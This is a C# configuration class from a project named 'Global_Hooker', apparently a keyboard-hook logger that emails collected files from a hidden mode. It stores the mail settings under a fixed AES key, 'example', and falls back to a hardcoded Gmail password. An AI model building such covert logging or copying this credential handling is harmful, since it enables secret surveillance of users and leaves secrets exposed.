using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using GodSharp.Encryption;

namespace Global_Hooker
{
    class ConfigurationManager
    {
        public string EmailAddresser { get; set; }
        public string EmailAddressee { get; set; }
        public string EmailPassword { get; set; }
        public string HiddenMode { get; set; }
        public int MaxFileSize { get; set; }

        private static ConfigurationManager _instace;

        public static ConfigurationManager Instance
        {
            get
            {
                if (_instace == null)
                    _instace = new ConfigurationManager();
                return _instace;
            }
        }

        private ConfigurationManager()
        {
            try
            {
                EmailAddressee = AES.Decrypt(Properties.Settings.Default.EmailAddressee, "example");
                EmailAddresser = AES.Decrypt(Properties.Settings.Default.EmailAddresser, "example");
                EmailPassword = AES.Decrypt(Properties.Settings.Default.EmailPassword, "example");
                HiddenMode = AES.Decrypt(Properties.Settings.Default.HiddenMode, "example");
                MaxFileSize = int.Parse(AES.Decrypt(Properties.Settings.Default.MaxFileSize, "example"));
                if (MaxFileSize <= 0)
                {
                    MaxFileSize = 500;
                }
            }
            catch (Exception)
            {
                EmailAddressee = "iipu.testing@gmail.com";
                EmailAddresser = "iipu.addresser@gmail.com";
                EmailPassword = "passwdpasswd";
                HiddenMode = "False";
                MaxFileSize = 500;
            }
        }

        public void SaveConfig()
        {
            var settings = Properties.Settings.Default;
            settings.EmailAddressee = AES.Encrypt(EmailAddressee, "example");
            settings.EmailAddresser = AES.Encrypt(EmailAddresser, "example");
            settings.EmailPassword = AES.Encrypt(EmailPassword, "example");
            settings.HiddenMode = AES.Encrypt(HiddenMode, "example");
            settings.MaxFileSize = AES.Encrypt(MaxFileSize.ToString(), "example");
            settings.Save();
        }
    }
}
